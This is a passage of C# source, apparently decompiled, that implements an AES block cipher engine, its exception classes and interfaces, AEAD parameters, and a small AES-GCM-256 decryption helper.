				if (i % num == 0)
				{
					num5 = (SubWord(Shift(num5, 8)) ^ rcon[i / num - 1]);
				}
				else if (num > 6 && i % num == 4)
				{
					num5 = SubWord(num5);
				}
				array[i >> 2, i & 3] = (array[i - num >> 2, (i - num) & 3] ^ num5);
			}
			if (!forEncryption)
			{
				for (int j = 1; j < ROUNDS; j++)
				{
					for (int k = 0; k < 4; k++)
					{
						array[j, k] = Inv_Mcol(array[j, k]);
					}
				}
			}
			return array;
		}

		public void Init(bool forEncryption, ICipherParameters parameters)
		{
			if (!(parameters is KeyParameter))
			{
				throw new ArgumentException("invalid parameter passed to AES init - " + parameters.GetType().ToString());
			}
			WorkingKey = GenerateWorkingKey(((KeyParameter)parameters).GetKey(), forEncryption);
			this.forEncryption = forEncryption;
		}

		public int GetBlockSize()
		{
			return 16;
		}

		public int ProcessBlock(byte[] input, int inOff, byte[] output, int outOff)
		{
			if (WorkingKey == null)
			{
				throw new InvalidOperationException("AES engine not initialised");
			}
			if (inOff + 16 > input.Length)
			{
				throw new DataLengthException("input buffer too short");
			}
			if (outOff + 16 > output.Length)
			{
				throw new DataLengthException("output buffer too short");
			}
			UnPackBlock(input, inOff);
			if (forEncryption)
			{
				EncryptBlock(WorkingKey);
			}
			else
			{
				DecryptBlock(WorkingKey);
			}
			PackBlock(output, outOff);
			return 16;
		}

		public void Reset()
		{
		}

		private void UnPackBlock(byte[] bytes, int off)
		{
			C0 = Pack.LE_To_UInt32(bytes, off);
			C1 = Pack.LE_To_UInt32(bytes, off + 4);
			C2 = Pack.LE_To_UInt32(bytes, off + 8);
			C3 = Pack.LE_To_UInt32(bytes, off + 12);
		}

		private void PackBlock(byte[] bytes, int off)
		{
			Pack.UInt32_To_LE(C0, bytes, off);
			Pack.UInt32_To_LE(C1, bytes, off + 4);
			Pack.UInt32_To_LE(C2, bytes, off + 8);
			Pack.UInt32_To_LE(C3, bytes, off + 12);
		}

		private void EncryptBlock(uint[,] KW)
		{
			C0 ^= KW[0, 0];
			C1 ^= KW[0, 1];
			C2 ^= KW[0, 2];
			C3 ^= KW[0, 3];
			int num = 1;
			uint num2;
			uint num3;
			uint num4;
			uint num5;
			while (num < ROUNDS - 1)
			{
				num2 = (T0[C0 & 0xFF] ^ T1[(C1 >> 8) & 0xFF] ^ T2[(C2 >> 16) & 0xFF] ^ T3[C3 >> 24] ^ KW[num, 0]);
				num3 = (T0[C1 & 0xFF] ^ T1[(C2 >> 8) & 0xFF] ^ T2[(C3 >> 16) & 0xFF] ^ T3[C0 >> 24] ^ KW[num, 1]);
				num4 = (T0[C2 & 0xFF] ^ T1[(C3 >> 8) & 0xFF] ^ T2[(C0 >> 16) & 0xFF] ^ T3[C1 >> 24] ^ KW[num, 2]);
				num5 = (T0[C3 & 0xFF] ^ T1[(C0 >> 8) & 0xFF] ^ T2[(C1 >> 16) & 0xFF] ^ T3[C2 >> 24] ^ KW[num++, 3]);
				C0 = (T0[num2 & 0xFF] ^ T1[(num3 >> 8) & 0xFF] ^ T2[(num4 >> 16) & 0xFF] ^ T3[num5 >> 24] ^ KW[num, 0]);
				C1 = (T0[num3 & 0xFF] ^ T1[(num4 >> 8) & 0xFF] ^ T2[(num5 >> 16) & 0xFF] ^ T3[num2 >> 24] ^ KW[num, 1]);
				C2 = (T0[num4 & 0xFF] ^ T1[(num5 >> 8) & 0xFF] ^ T2[(num2 >> 16) & 0xFF] ^ T3[num3 >> 24] ^ KW[num, 2]);
				C3 = (T0[num5 & 0xFF] ^ T1[(num2 >> 8) & 0xFF] ^ T2[(num3 >> 16) & 0xFF] ^ T3[num4 >> 24] ^ KW[num++, 3]);
			}
			num2 = (T0[C0 & 0xFF] ^ T1[(C1 >> 8) & 0xFF] ^ T2[(C2 >> 16) & 0xFF] ^ T3[C3 >> 24] ^ KW[num, 0]);
			num3 = (T0[C1 & 0xFF] ^ T1[(C2 >> 8) & 0xFF] ^ T2[(C3 >> 16) & 0xFF] ^ T3[C0 >> 24] ^ KW[num, 1]);
			num4 = (T0[C2 & 0xFF] ^ T1[(C3 >> 8) & 0xFF] ^ T2[(C0 >> 16) & 0xFF] ^ T3[C1 >> 24] ^ KW[num, 2]);
			num5 = (T0[C3 & 0xFF] ^ T1[(C0 >> 8) & 0xFF] ^ T2[(C1 >> 16) & 0xFF] ^ T3[C2 >> 24] ^ KW[num++, 3]);
			C0 = (uint)(S[num2 & 0xFF] ^ (S[(num3 >> 8) & 0xFF] << 8) ^ (S[(num4 >> 16) & 0xFF] << 16) ^ (S[num5 >> 24] << 24) ^ (int)KW[num, 0]);
			C1 = (uint)(S[num3 & 0xFF] ^ (S[(num4 >> 8) & 0xFF] << 8) ^ (S[(num5 >> 16) & 0xFF] << 16) ^ (S[num2 >> 24] << 24) ^ (int)KW[num, 1]);
			C2 = (uint)(S[num4 & 0xFF] ^ (S[(num5 >> 8) & 0xFF] << 8) ^ (S[(num2 >> 16) & 0xFF] << 16) ^ (S[num3 >> 24] << 24) ^ (int)KW[num, 2]);
			C3 = (uint)(S[num5 & 0xFF] ^ (S[(num2 >> 8) & 0xFF] << 8) ^ (S[(num3 >> 16) & 0xFF] << 16) ^ (S[num4 >> 24] << 24) ^ (int)KW[num, 3]);
		}

		private void DecryptBlock(uint[,] KW)
		{
			C0 ^= KW[ROUNDS, 0];
			C1 ^= KW[ROUNDS, 1];
			C2 ^= KW[ROUNDS, 2];
			C3 ^= KW[ROUNDS, 3];
			int num = ROUNDS - 1;
			uint num2;
			uint num3;
			uint num4;
			uint num5;
			while (num > 1)
			{
				num2 = (Tinv0[C0 & 0xFF] ^ Tinv1[(C3 >> 8) & 0xFF] ^ Tinv2[(C2 >> 16) & 0xFF] ^ Tinv3[C1 >> 24] ^ KW[num, 0]);
				num3 = (Tinv0[C1 & 0xFF] ^ Tinv1[(C0 >> 8) & 0xFF] ^ Tinv2[(C3 >> 16) & 0xFF] ^ Tinv3[C2 >> 24] ^ KW[num, 1]);
				num4 = (Tinv0[C2 & 0xFF] ^ Tinv1[(C1 >> 8) & 0xFF] ^ Tinv2[(C0 >> 16) & 0xFF] ^ Tinv3[C3 >> 24] ^ KW[num, 2]);
				num5 = (Tinv0[C3 & 0xFF] ^ Tinv1[(C2 >> 8) & 0xFF] ^ Tinv2[(C1 >> 16) & 0xFF] ^ Tinv3[C0 >> 24] ^ KW[num--, 3]);
				C0 = (Tinv0[num2 & 0xFF] ^ Tinv1[(num5 >> 8) & 0xFF] ^ Tinv2[(num4 >> 16) & 0xFF] ^ Tinv3[num3 >> 24] ^ KW[num, 0]);
				C1 = (Tinv0[num3 & 0xFF] ^ Tinv1[(num2 >> 8) & 0xFF] ^ Tinv2[(num5 >> 16) & 0xFF] ^ Tinv3[num4 >> 24] ^ KW[num, 1]);
				C2 = (Tinv0[num4 & 0xFF] ^ Tinv1[(num3 >> 8) & 0xFF] ^ Tinv2[(num2 >> 16) & 0xFF] ^ Tinv3[num5 >> 24] ^ KW[num, 2]);
				C3 = (Tinv0[num5 & 0xFF] ^ Tinv1[(num4 >> 8) & 0xFF] ^ Tinv2[(num3 >> 16) & 0xFF] ^ Tinv3[num2 >> 24] ^ KW[num--, 3]);
			}
			num2 = (Tinv0[C0 & 0xFF] ^ Tinv1[(C3 >> 8) & 0xFF] ^ Tinv2[(C2 >> 16) & 0xFF] ^ Tinv3[C1 >> 24] ^ KW[num, 0]);
			num3 = (Tinv0[C1 & 0xFF] ^ Tinv1[(C0 >> 8) & 0xFF] ^ Tinv2[(C3 >> 16) & 0xFF] ^ Tinv3[C2 >> 24] ^ KW[num, 1]);
			num4 = (Tinv0[C2 & 0xFF] ^ Tinv1[(C1 >> 8) & 0xFF] ^ Tinv2[(C0 >> 16) & 0xFF] ^ Tinv3[C3 >> 24] ^ KW[num, 2]);
			num5 = (Tinv0[C3 & 0xFF] ^ Tinv1[(C2 >> 8) & 0xFF] ^ Tinv2[(C1 >> 16) & 0xFF] ^ Tinv3[C0 >> 24] ^ KW[num, 3]);
			C0 = (uint)(Si[num2 & 0xFF] ^ (Si[(num5 >> 8) & 0xFF] << 8) ^ (Si[(num4 >> 16) & 0xFF] << 16) ^ (Si[num3 >> 24] << 24) ^ (int)KW[0, 0]);
			C1 = (uint)(Si[num3 & 0xFF] ^ (Si[(num2 >> 8) & 0xFF] << 8) ^ (Si[(num5 >> 16) & 0xFF] << 16) ^ (Si[num4 >> 24] << 24) ^ (int)KW[0, 1]);
			C2 = (uint)(Si[num4 & 0xFF] ^ (Si[(num3 >> 8) & 0xFF] << 8) ^ (Si[(num2 >> 16) & 0xFF] << 16) ^ (Si[num5 >> 24] << 24) ^ (int)KW[0, 2]);
			C3 = (uint)(Si[num5 & 0xFF] ^ (Si[(num4 >> 8) & 0xFF] << 8) ^ (Si[(num3 >> 16) & 0xFF] << 16) ^ (Si[num2 >> 24] << 24) ^ (int)KW[0, 3]);
		}
	}

	public class CryptoException : Exception
	{
		public CryptoException()
		{
		}

		public CryptoException(string message)
			: base(message)
		{
		}

		public CryptoException(string message, Exception exception)
			: base(message, exception)
		{
		}
	}

	public class DataLengthException : CryptoException
	{
		public DataLengthException()
		{
		}

		public DataLengthException(string message)
			: base(message)
		{
		}

		public DataLengthException(string message, Exception exception)
			: base(message, exception)
		{
		}
	}

	public interface IBlockCipher
	{
		string AlgorithmName
		{
			get;
		}

		bool IsPartialBlockOkay
		{
			get;
		}

		void Init(bool forEncryption, ICipherParameters parameters);

		int GetBlockSize();

		int ProcessBlock(byte[] inBuf, int inOff, byte[] outBuf, int outOff);

		void Reset();
	}
	public interface ICipherParameters
	{
	}

	public class InvalidCipherTextException : CryptoException
	{
		public InvalidCipherTextException()
		{
		}

		public InvalidCipherTextException(string message)
			: base(message)
		{
		}

		public InvalidCipherTextException(string message, Exception exception)
			: base(message, exception)
		{
		}
	}

	public static class AesGcm256
	{
		public static string Decrypt(byte[] encryptedBytes, byte[] key, byte[] iv)
		{
			string result = string.Empty;
			try
			{
				GcmBlockCipher gcmBlockCipher = new GcmBlockCipher(new AesFastEngine());
				AeadParameters parameters = new AeadParameters(new KeyParameter(key), 128, iv, null);
				gcmBlockCipher.Init(false, parameters);
				byte[] array = new byte[gcmBlockCipher.GetOutputSize(encryptedBytes.Length)];
				int outOff = gcmBlockCipher.ProcessBytes(encryptedBytes, 0, encryptedBytes.Length, array, 0);
				gcmBlockCipher.DoFinal(array, outOff);
				result = Encoding.UTF8.GetString(array).TrimEnd("\r\n\0".ToCharArray());
				return result;
			}
			catch
			{
				return result;
			}
		}
	}



	public class AeadParameters : ICipherParameters
	{
		private readonly byte[] associatedText;

		private readonly byte[] nonce;

		private readonly KeyParameter key;

		private readonly int macSize;

		public virtual KeyParameter Key => key;

		public virtual int MacSize => macSize;

		public AeadParameters(KeyParameter key, int macSize, byte[] nonce, byte[] associatedText)
		{
			this.key = key;
			this.nonce = nonce;
			this.macSize = macSize;
			this.associatedText = associatedText;
		}

		public virtual byte[] GetAssociatedText()
		{
			return associatedText;
		}

		public virtual byte[] GetNonce()
		{
			return nonce;
		}
	}


}
